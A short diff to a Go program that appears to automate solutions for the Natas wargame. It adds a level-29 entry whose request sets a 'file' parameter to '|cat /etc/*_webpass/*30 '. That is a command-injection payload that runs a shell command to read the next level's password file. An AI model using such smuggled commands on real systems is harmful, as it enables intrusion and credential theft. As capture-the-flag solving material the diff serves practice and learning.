@@ -973,6 +973,15 @@ var levels = [...]Grabber{
 		"natas29:",
 		32,
 	},
+	//level 29
+	Prefixed{
+		Get{
+			grab,
+			SetData{"file": Text{"|cat /etc/*_webpass/*30 "}},
+		},
+		"</html>\n",
+		32,
+	},
 }
 
 func e(err error) {
